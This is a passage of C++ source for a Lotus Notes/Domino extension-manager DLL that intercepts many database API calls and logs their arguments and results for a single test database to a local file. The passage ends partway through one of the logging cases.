// RED_Interceptors.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"


	// Globals
	BOOL gHooksRegistered = FALSE;
	char DataDir[MAX_PATH + 1];
	char LogFile[MAX_PATH + 1];
	FILE *gLogStream = (FILE *)0;
	WORD gRecursionID;
	EMHANDLER gNoteOpenHandlerProc;
	EMHANDLER gNoteOpenUNIDHandlerProc;
	EMHANDLER gNoteOpenExtHandlerProc;
	EMHANDLER gDbGetNoteInfoByUnidProc;
	EMHANDLER gDbReadObjectProc;
	EMHANDLER gDbGetObjectSizeProc;
	EMHANDLER gDbGetNoteInfoProc;
	EMHANDLER gNoteGetInfoProc;
	EMHANDLER gEMProc;
	HEMREGISTRATION	  hHandler;
	HEMREGISTRATION	  hHandlerUNID;
	HEMREGISTRATION	  hHandlerExt;
	HEMREGISTRATION hHandlerDbGetNoteInfoByUnid;
	HEMREGISTRATION hHandlerDbReadObject;
	HEMREGISTRATION hHandlerDbGetObjectSize;
	HEMREGISTRATION hHandlerDbGetNoteInfo;
	HEMREGISTRATION hHandlerNoteGetInfo;
	NOTEID targetIDs[3] = { 0x8F6, 0x8FA, 0x8FE };
	HCOLLECTION * myColl = NULL;
	unsigned long myCount = 0;
	UNID targetUNIDs[3] = { {
			{ 0xED99272A, 0xC8E4122D },	// File
			{ 0x4325803B, 0x002B38CE }	// Note
		}, {
			{ 0x3650ECEA, 0xB30B8B92 },	// File
			{ 0x4325803B, 0x002B466A }	// Note
		}, {
			{ 0xFAEAD056, 0x12110849 },	// File
			{ 0x4325803B, 0x002B4EB6 }	// Note
		} };
	char far targetDB[] = u8"demo\\red_test.nsf";
	UNID couchUNID = { 
					   { 0xb398ee71, 0xfa743da6 },	// File
					   { 0xa3002e73, 0x359038da }	// Note
					 };
	NOTEID couchID;

	// Structs

	EXTMGRPROC HookTable[] = {
		{ EM_NSFDBCLOSESESSION, 0, "EM_NSFDBCLOSESESSION" },
		{ EM_NSFDBCLOSE, 0, "EM_NSFDBCLOSE" },
		{ EM_NSFDBCREATE, 0, "EM_NSFDBCREATE" },
		{ EM_NSFDBDELETE, 0, "EM_NSFDBDELETE" },
		{ EM_NSFNOTEOPEN, 0, "EM_NSFNOTEOPEN" },
		{ EM_NSFNOTECLOSE, 0, "EM_NSFNOTECLOSE" },
		{ EM_NSFNOTECREATE, 0, "EM_NSFNOTECREATE" },
		{ EM_NSFNOTEDELETE, 0, "EM_NSFNOTEDELETE" },
		{ EM_NSFNOTEOPENBYUNID, 0, "EM_NSFNOTEOPENBYUNID" },
		{ EM_FTGETLASTINDEXTIME, 0, "EM_FTGETLASTINDEXTIME" },
		{ EM_FTINDEX, 0, "EM_FTINDEX" },
		{ EM_FTSEARCH, 0, "EM_FTSEARCH" },
		{ EM_NIFFINDBYKEY, 0, "EM_NIFFINDBYKEY" },
		{ EM_NIFFINDBYNAME, 0, "EM_NIFFINDBYNAME" },
		{ EM_NIFREADENTRIES, 0, "EM_NIFREADENTRIES" },
		{ EM_NIFUPDATECOLLECTION, 0, "EM_NIFUPDATECOLLECTION" },
		{ EM_NSFDBALLOCOBJECT, 0, "EM_NSFDBALLOCOBJECT" },
		{ EM_NSFDBCOMPACT, 0, "EM_NSFDBCOMPACT" },
		{ EM_NSFDBDELETENOTES, 0,  "EM_NSFDBDELETENOTES" },
		{ EM_NSFDBFREEOBJECT, 0, "EM_NSFDBFREEOBJECT" },
		{ EM_NSFDBGETMODIFIEDNOTETABLE, 0, "EM_NSFDBGETMODIFIEDNOTETABLE" },
		{ EM_NSFDBGETNOTEINFO, 0, "EM_NSFDBGETNOTEINFO" },
		{ EM_NSFDBGETNOTEINFOBYUNID, 0, "EM_NSFDBGETNOTEINFOBYUNID" },
		{ EM_NSFDBGETOBJECTSIZE, 0, "EM_NSFDBGETOBJECTSIZE" },
		{ EM_NSFDBGETSPECIALNOTEID, 0, "EM_NSFDBGETSPECIALNOTEID" },
		{ EM_NSFDBINFOGET, 0, "EM_NSFDBINFOGET" },
		{ EM_NSFDBINFOSET, 0, "EM_NSFDBINFOSET" },
		{ EM_NSFDBLOCATEBYREPLICAID, 0, "EM_NSFDBLOCATEBYREPLICAID" },
		{ EM_NSFDBMODIFIEDTIME, 0, "EM_NSFDBMODIFIEDTIME" },
		{ EM_NSFDBREADOBJECT, 0, "EM_NSFDBREADOBJECT" },
		{ EM_NSFDBREALLOCOBJECT, 0, "EM_NSFDBREALLOCOBJECT" },
		{ EM_NSFDBREPLICAINFOGET, 0, "EM_NSFDBREPLICAINFOGET" },
		{ EM_NSFDBREPLICAINFOSET, 0, "EM_NSFDBREPLICAINFOSET" },
		{ EM_NSFDBSPACEUSAGE, 0, "EM_NSFDBSPACEUSAGE" },
		{ EM_NSFDBSTAMPNOTES, 0, "EM_NSFDBSTAMPNOTES" },
		{ EM_NSFDBWRITEOBJECT, 0, "EM_NSFDBWRITEOBJECT" },
		{ EM_NSFNOTEUPDATE, 0, "EM_NSFNOTEUPDATE" },
		{ EM_NIFOPENCOLLECTION, 0, "EM_NIFOPENCOLLECTION" },
		{ EM_NIFCLOSECOLLECTION, 0, "EM_NIFCLOSECOLLECTION" },
		{ EM_NSFDBGETBUILDVERSION, 0, "EM_NSFDBGETBUILDVERSION" },
		{ EM_NSFDBRENAME, 0, "EM_NSFDBRENAME" },
		{ EM_NSFDBITEMDEFTABLE, 0, "EM_NSFDBITEMDEFTABLE" },
		{ EM_NSFDBREOPEN, 0, "EM_NSFDBREOPEN" },
		{ EM_NSFDBOPENEXTENDED, 0, "EM_NSFDBOPENEXTENDED" },
		{ EM_NSFNOTEDECRYPT, 0, "EM_NSFNOTEDECRYPT" },
		{ EM_GETPASSWORD, 0, "EM_GETPASSWORD" },
		{ EM_SETPASSWORD, 0, "EM_SETPASSWORD" },
		{ EM_CLEARPASSWORD, 0, "EM_CLEARPASSWORD" },
		{ EM_NSFCONFLICTHANDLER, 0, "EM_NSFCONFLICTHANDLER" },
		{ EM_NSFNOTEUPDATEXTENDED, 0, "NSFNOTEUPDATEXTENDED" },
		{ EM_SCHFREETIMESEARCH, 0, "SCHFREETIMESEARCH" },
		{ EM_SCHRETRIEVE, 0, "SCHRETRIEVE" },
		{ EM_SCHSRVRETRIEVE, 0, "SCHSRVRETRIEVE" },
		{ EM_NSFDBCOMPACTEXTENDED, 0, "EM_NSFDBCOMPACTEXTENDED" },
		{ EM_ADMINPPROCESSREQUEST, 0, "EM_ADMINPPROCESSREQUEST" },
		{ EM_NIFGETCOLLECTIONDATA, 0, "NIFGETCOLLECTIONDATA" },
		{ EM_NSFDBCOPYNOTE, 0, "NSFDBCOPYNOTE" },
		{ EM_NSFNOTECOPY, 0, "NSFNOTECOPY" },
		{ EM_NSFNOTEATTACHFILE, 0, "NSFNOTEATTACHFILE" },
		{ EM_NSFNOTEDETACHFILE, 0, "NSFNOTEDETACHFILE" },
		{ EM_NSFNOTEEXTRACTFILE, 0, "NSFNOTEEXTRACTFILE" },
		{ EM_NSFNOTEATTACHOLE2OBJECT, 0, "NSFNOTEATTACHOLE2OBJECT" },
		{ EM_NSFNOTEDELETEOLE2OBJECT, 0, "NSFNOTEDELETEOLE2OBJECT" },
		{ EM_NSFNOTEEXTRACTOLE2OBJECT, 0, "NSFNOTEEXTRACTOLE2OBJECT" },
		{ EM_NSGETSERVERLIST, 0, "NSGETSERVERLIST" },
		{ EM_NSFDBCOPY, 0, "NSFDBCOPY" },
		{ EM_NSFDBCREATEANDCOPY, 0, "NSFDBCREATEANDCOPY" },
		{ EM_NSFDBCOPYACL, 0, "NSFDBCOPYACL" },
		{ EM_NSFDBCOPYTEMPLATEACL, 0, "NSFDBCOPYTEMPLATEACL" },
		{ EM_NSFDBCREATEACLFROMTEMPLATE, 0, "NSFDBCREATEACLFROMTEMPLATE" },
		{ EM_NSFDBREADACL, 0, "NSFDBREADACL" },
		{ EM_NSFDBSTOREACL, 0, "NSFDBSTOREACL" },
		{ EM_NSFDBFILTER, 0, "NSFDBFILTER" },
		{ EM_FTDELETEINDEX, 0, "FTDELETEINDEX" },
		{ EM_NSFNOTEGETINFO, 0, "NSFNOTEGETINFO" },
		{ EM_NSFNOTESETINFO, 0, "NSFNOTESETINFO" },
		{ EM_NSFNOTECOMPUTEWITHFORM, 0, "NSFNOTECOMPUTEWITHFORM" },
		{ EM_NIFFINDDESIGNNOTE, 0, "NIFFINDDESIGNNOTE" },
		{ EM_NIFFINDPRIVATEDESIGNNOTE, 0, "NIFFINDPRIVATEDESIGNNOTE" },
		{ EM_NIFGETLASTMODIFIEDTIME, 0, "NIFGETLASTMODIFIEDTIME" },
		{ EM_FTSEARCHEXT, 0, "FTSEARCHEXT" },
		{ EM_NAMELOOKUP, 0, "NAMELOOKUP" },
		{ EM_NSFNOTEUPDATEMAILBOX, 0, "NSFNOTEUPDATEMAILBOX" },
		{ EM_NIFFINDDESIGNNOTEEXT, 0, "NIFFINDDESIGNNOTEEXT" },
		{ EM_AGENTOPEN, 0, "AGENTOPEN" },
		{ EM_AGENTCLOSE, 0, "AGENTCLOSE" },
		{ EM_AGENTISENABLED, 0, "AGENTISENABLED" },
		{ EM_AGENTCREATERUNCONTEXT, 0, "AGENTCREATERUNCONTEXT" },
		{ EM_AGENTDESTROYRUNCONTEXT, 0, "AGENTDESTROYRUNCONTEXT" },
		{ EM_AGENTSETDOCUMENTCONTEXT, 0, "AGENTSETDOCUMENTCONTEXT" },
		{ EM_AGENTSETTIMEEXECUTIONLIMIT, 0, "AGENTSETTIMEEXECUTIONLIMIT" },
		{ EM_AGENTQUERYSTDOUTBUFFER, 0, "AGENTQUERYSTDOUTBUFFER" },
		{ EM_AGENTREDIRECTSTDOUT, 0, "AGENTREDIRECTSTDOUT" },
		{ EM_NAMELOOKUP2, 0, "NAMELOOKUP2" },
		{ EM_NSFNOTEOPENEXTENDED, 0, "EM_NSFNOTEOPENEXTENDED" },
		{ EM_TERMINATENSF, 0, "EM_TERMINATENSF" },
		{ EM_MAILSENDNOTE, 0, "EM_MAILSENDNOTE" },
		{ EM_AGENTRUN, 0, "EM_AGENTRUN" },
		{ EM_SECAUTHENTICATION, 0, "EM_SECAUTHENTICATION" },
		{ EM_NSFMARKREAD, 0, "EM_NSFMARKREAD" },
		{ EM_NSFADDTOFOLDER, 0, "EM_NSFADDTOFOLDER" },
		{ EM_NSFDBSPACEUSAGESCALED, 0, "EM_NSFDBSPACEUSAGESCALED" },
		{ EM_NSFDBGETMAJMINVERSION, 0, "EM_NSFDBGETMAJMINVERSION" },
		{ EM_ROUTERJOURNALMESSAGE, 0, "EM_ROUTERJOURNALMESSAGE" },
		{ EM_SMTPCONNECT, 0, "EM_SMTPCONNECT" },
		{ EM_SMTPCOMMAND, 0, "EM_SMTPCOMMAND" },
		{ EM_SMTPMESSAGEACCEPT, 0, "EM_SMPTMESSAGEACCEPT" },
		{ EM_SMTPDISCONNECT, 0, "EM_SMTPDISCONNECT" },
		{ EM_NSFARCHIVECOPYNOTES, 0, "EM_NSFARCHIVECOPYNOTES" },
		{ EM_NSFARCHIVEDELETENOTES, 0, "EM_NSFARCHIVEDELETENOTES" },
		{ EM_NSFNOTEEXTRACTWITHCALLBACK, 0, "EM_NSFNOTEEXTRACTWITHCALLBACK" },
		{ EM_NSFDBSTAMPNOTESMULTIITEM, 0, "EM_NSFDBSTAMPNOTESMULTIITEM" },
		{ EM_MEDIARECOVERY_NOTE, 0, "EM_MEDIARECOVERY_NOTE" },
		{ EM_NSFGETCHANGEDDBS, 0, "EM_NSFGETCHANGEDDBS" },
		{ EM_NSFDBMODIFIEDTIMEBYNAME, 0, "EM_NSFDBMODIFIEDTIMEBYNAME" },
		{ EM_NSFGETDBCHANGES, 0, "EM_NSFGETDBCHANGES" },
		{ EM_NSFNOTECIPHERDECRYPT, 0, "EM_NSFNOTECIPHERDECRYPT" },
		{ EM_NSFNOTECIPHEREXTRACTFILE, 0, "EM_NSFNOTECIPHEREXTRACTFILE" },
		{ EM_NSFNOTECIPHEREXTRACTWITHCALLBACK, 0, "EM_NSFNOTECIPHEREXTRACTWITHCALLBACK" },
		{ EM_NSFNOTECIPHEREXTRACTOLE2OBJECT, 0, "EM_NSFNOTECIPHEREXTRACTOLE2OBJECT" },
		{ EM_NSFNOTECIPHERDELETEOLE2OBJECT, 0, "EM_NSFNOTECIPHERDELETEOLE2OBJECT" },
		{ EM_NSFDBNOTELOCK, 0, "EM_NSFDBNOTELOCK" },
		{ EM_NSFDBNOTEUNLOCK, 0, "EM_NSFDBNOTEUNLOCK" },

		{ 0, 0, NULL }
	};

	// Funcs

	STATUS LNPUBLIC ProcessEM(EMRECORD FAR * record) {
		STATUS error = NOERROR;
		VARARG_PTR ap;
		BOOL logit = FALSE;
		char buf2[MAX_PATH + 1], out[MAX_PATH + 50];
		char far path[MAX_PATH + 1];
		char far upath[2 * (MAX_PATH + 1)];
		DBHANDLE hDb, hDbV, hDbD;
		NOTEHANDLE hNote, note, far * newnote, form;
		DWORD far * matches, far * returned, far * skipped, mask, count, skipcount, flags2;
		HCOLLECTION hcoll, coll;
		void far * keys, far * ptr, * context;
		WORD flags, far * flgs, far * buflength, nav, skipnav, member;
		COLLECTIONPOSITION far * pos;
		const char far * name;
		DHANDLE far * buffer, far * data;
		CWF_ERROR_PROC routine;

		ap = record->Ap;

		switch (record->EId) {
		case EM_NSFNOTEOPEN:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEID noteid = VARARG_GET(ap, NOTEID);
				WORD flags = VARARG_GET(ap, WORD);
				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEOPEN(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEOPEN(");
				}
				sprintf(out, "%d, 0x%X, 0x%X, ", hDb, noteid, flags);
				LogLine(out);
				NOTEHANDLE far * hNote = VARARG_GET(ap, NOTEHANDLE far *);
				if (NULL == hNote)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *hNote);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}
			break;
		case EM_NSFNOTECLOSE:
			hNote = VARARG_GET(ap, NOTEHANDLE);

			hDb = (DBHANDLE)0;
			NSFNoteGetInfo(hNote, _NOTE_DB, &hDb);
			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);
			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTECLOSE(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTECLOSE(");
				}
				sprintf(out, "%d)", hNote);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFNOTECREATE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);
			
			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEHANDLE FAR * hNote = VARARG_GET(ap, NOTEHANDLE FAR *);
				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTECREATE(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTECREATE(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == hNote)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *hNote);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFNOTEDELETE:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				NOTEID noteid = VARARG_GET(ap, NOTEID);
				WORD flags = VARARG_GET(ap, WORD);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEDELETE(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEDELETE(");
				}
				sprintf(out, "%d, 0x%X, 0x%X)", hDb, noteid, flags);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFNOTEOPENBYUNID:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				UNID far * unid = VARARG_GET(ap, UNID far *);
				WORD flags = VARARG_GET(ap, WORD);
				NOTEHANDLE far * hNote = VARARG_GET(ap, NOTEHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFNOTEOPENBYUNID(");
				}
				else {
					LogLine("-> AFTER EM_NSFNOTEOPENBYUNID(");
				}
				sprintf(out, "%d, { 0x%X : 0x%X, 0x%X : 0x%X }, %d, ", hDb, unid->File.Innards[1], unid->File.Innards[0], unid->Note.Innards[1], unid->Note.Innards[0], flags);
				LogLine(out);
				if (NULL == hNote)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *hNote);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_FTGETLASTINDEXTIME:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				TIMEDATE far * time = VARARG_GET(ap, TIMEDATE far *);
				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_FTGETLASTINDEXTIME(");
				}
				else {
					LogLine("-> AFTER EM_FTGETLASTINDEXTIME(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == time)
					LogLine("NULL)");
				else {
					sprintf(out, "{ 0x%X : 0x%X })", time->Innards[1], time->Innards[0]);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_FTINDEX:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				WORD options = VARARG_GET(ap, WORD);
				char far * stop = VARARG_GET(ap, char far *);
				FT_INDEX_STATS far * stats = VARARG_GET(ap, FT_INDEX_STATS far *);
				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_FTINDEX(");
				}
				else {
					LogLine("-> AFTER EM_FTINDEX(");
				}
				sprintf(out, "%d, 0x%X, %s, ", hDb, options, stop);
				LogLine(out);
				if (NULL == stats)
					LogLine("NULL)");
				else {
					sprintf(out, "{ %ul, %ul, %ul, %ul })", stats->DocsAdded, stats->DocsUpdated, stats->DocsDeleted, stats->BytesIndexed);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_FTSEARCH:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DHANDLE far * hSearch = VARARG_GET(ap, DHANDLE far *);
				HCOLLECTION hColl = VARARG_GET(ap, HCOLLECTION);
				char far * query = VARARG_GET(ap, char far *);
				DWORD options = VARARG_GET(ap, DWORD);
				WORD limit = VARARG_GET(ap, WORD);
				DHANDLE hIDTable = VARARG_GET(ap, DHANDLE);
				DWORD far * numDocs = VARARG_GET(ap, DWORD far *);
				DHANDLE far * reserved = VARARG_GET(ap, DHANDLE far *);
				DHANDLE far * results = VARARG_GET(ap, DHANDLE far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_FTSEARCH(");
				}
				else {
					LogLine("-> AFTER EM_FTSEARCH(");
				}
				sprintf(out, "%d, ", hDb);
				LogLine(out);
				if (NULL == hSearch)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *hSearch);
					LogLine(out);
				}
				sprintf(out, "%d, ", hColl);
				LogLine(out);
				if (NULL == query)
					LogLine("NULL, ");
				else {
					sprintf(out, "%s, ", *query);
					LogLine(out);
				}
				sprintf(out, "0x%X, %d, %d, ", options, limit, hIDTable);
				LogLine(out);
				if (NULL == numDocs)
					LogLine("NULL, ");
				else {
					sprintf(out, "%ul, ", *numDocs);
					LogLine(out);
				}
				if (NULL == reserved)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *reserved);
					LogLine(out);
				}
				if (NULL == results)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *results);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NIFFINDBYKEY:
			hcoll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(hcoll) == 0) {
				keys = VARARG_GET(ap, void far *);
				flags = VARARG_GET(ap, WORD);
				pos = VARARG_GET(ap, COLLECTIONPOSITION far *);
				matches = VARARG_GET(ap, DWORD far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFFINDBYKEY(");
				}
				else {
					LogLine("-> AFTER EM_NIFFINDBYKEY(");
				}
				sprintf(out, "%d, ", hcoll);
				LogLine(out);
				if (NULL == keys)
					LogLine("NULL, ");
				else {
					ITEM_TABLE far * table = (ITEM_TABLE far *)keys;
					sprintf(out, "{ %d, %d }, ", table->Items, table->Length);
					LogLine(out);
				}
				sprintf(out, "0x%X, ", flags);
				LogLine(out);
				if (NULL == pos)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ %d, %d, %d, [ ... ] }, ", pos->Level, pos->MinLevel, pos->MaxLevel);
					LogLine(out);
					/*for (int i = 0; i < MAXTUMBLERLEVELS; i++) {
						sprintf(out, "%ul, ", pos->Tumbler[i]);
						LogLine(out);
					}
					LogLine(" ] }, ");*/
				}
				if (NULL == matches)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *matches);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NIFFINDBYNAME:
			hcoll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(hcoll) == 0) {
				name = VARARG_GET(ap, const char far *);
				flags = VARARG_GET(ap, WORD);
				pos = VARARG_GET(ap, COLLECTIONPOSITION far *);
				matches = VARARG_GET(ap, DWORD far *);

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFFINDBYNAME(");
				}
				else {
					LogLine("-> AFTER EM_NIFFINDBYNAME(");
				}
				sprintf(out, "%d, ", hcoll);
				LogLine(out);
				if (NULL == name)
					LogLine("NULL, ");
				else {
					sprintf(out, "%s, ", name);
					LogLine(out);
				}
				sprintf(out, "0x%X, ", flags);
				LogLine(out);
				if (NULL == pos)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ %d, %d, %d, [ ...] }, ", pos->Level, pos->MinLevel, pos->MaxLevel);
					LogLine(out);
					/*for (int i = 0; i < MAXTUMBLERLEVELS; i++) {
						sprintf(out, "%ul, ", pos->Tumbler[i]);
						LogLine(out);
					}
					LogLine(" ] }, ");*/
				}
				if (NULL == matches)
					LogLine("NULL)");
				else {
					sprintf(out, "%d)", *matches);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NIFREADENTRIES:
			hcoll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(hcoll) == 0) {
				//NIFUpdateCollection(coll);

				pos = VARARG_GET(ap, COLLECTIONPOSITION far *);
				skipnav = VARARG_GET(ap, WORD);
				skipcount = VARARG_GET(ap, DWORD);
				nav = VARARG_GET(ap, WORD);
				count = VARARG_GET(ap, DWORD);
				mask = VARARG_GET(ap, DWORD);
				buffer = VARARG_GET(ap, DHANDLE far *);
				buflength = VARARG_GET(ap, WORD far *);
				skipped = VARARG_GET(ap, DWORD far *);
				returned = VARARG_GET(ap, DWORD far *);
				flgs = VARARG_GET(ap, WORD far *);

				BOOL after = record->Status == EM_AFTER ? TRUE : FALSE;

				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFREADENTRIES(");
				}
				else {
					LogLine("-> AFTER EM_NIFREADENTRIES(");
				}
				sprintf(out, "%d, ", hcoll);
				LogLine(out);
				if (NULL == pos)
					LogLine("NULL, ");
				else {
					sprintf(out, "{ %d, %d, %d, [ ... ] }, ", pos->Level, pos->MinLevel, pos->MaxLevel);
					LogLine(out);
					/*for (int i = 0; i < MAXTUMBLERLEVELS; i++) {
						sprintf(out, "%ul, ", pos->Tumbler[i]);
						LogLine(out);
					}
					LogLine(" ] }, ");*/
				}
				sprintf(out, "0x%X, %ul, 0x%X, 0x%X, 0x%X, ", skipnav, skipcount, nav, count, mask);
				LogLine(out);
				if (NULL == buffer)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *buffer);
					LogLine(out);
				}
				if (NULL == buflength)
					LogLine("NULL, ");
				else {
					sprintf(out, "%d, ", *buflength);
					LogLine(out);
				}
				if (NULL == skipped)
					LogLine("NULL, ");
				else {
					sprintf(out, "%ul, ", *skipped);
					LogLine(out);
				}
				if (NULL == returned)
					LogLine("NULL, ");
				else {
					sprintf(out, "%ul, ", *returned);
					LogLine(out);
				}
				if (NULL == flgs)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", *flgs);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d\n", record->Status);
					LogLine(out);
					if (buffer != NULLHANDLE) {
						char far buff[MAXPATH];
					}
				}
				LogLine("\n");
			}

			break;
		case EM_NIFUPDATECOLLECTION:
			hcoll = VARARG_GET(ap, HCOLLECTION);

			if (isInList(hcoll) == 0) {
				gLogStream = fopen(LogFile, "a+");

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NIFUPDATECOLLECTION(");
				}
				else {
					LogLine("-> AFTER EM_NIFUPDATECOLLECTION(");
				}
				sprintf(out, "%d)", hcoll);
				LogLine(out);
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBALLOCOBJECT:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
			logit = memcmp(targetDB, (upath + strlen(upath) - strlen(targetDB)), strlen(upath) + 1);

			if (logit == 0) {
				gLogStream = fopen(LogFile, "a+");

				DWORD size = VARARG_GET(ap, DWORD);
				WORD cls = VARARG_GET(ap, WORD);
				WORD priv = VARARG_GET(ap, WORD);
				DWORD far * objid = VARARG_GET(ap, DWORD far *);

				if (record->NotificationType == EM_BEFORE) {
					LogLine("-> BEFORE EM_NSFDBALLOCOBJECT(");
				}
				else {
					LogLine("-> AFTER EM_NSFDBALLOCOBJECT(");
				}
				sprintf(out, "%d, %ul, %d, 0x%X, ", hDb, size, cls, priv);
				LogLine(out);
				if (NULL == objid)
					LogLine("NULL)");
				else {
					sprintf(out, "0x%X)", *objid);
					LogLine(out);
				}
				if (record->NotificationType == EM_AFTER) {
					sprintf(out, " -> %d", record->Status);
					LogLine(out);
				}
				LogLine("\n");
			}

			break;
		case EM_NSFDBDELETENOTES:
			hDb = VARARG_GET(ap, DBHANDLE);

			NSFDbPathGet(hDb, path, buf2);
			OSTranslate(OS_TRANSLATE_LMBCS_TO_UTF8, path, strlen(path), upath, sizeof(upath));
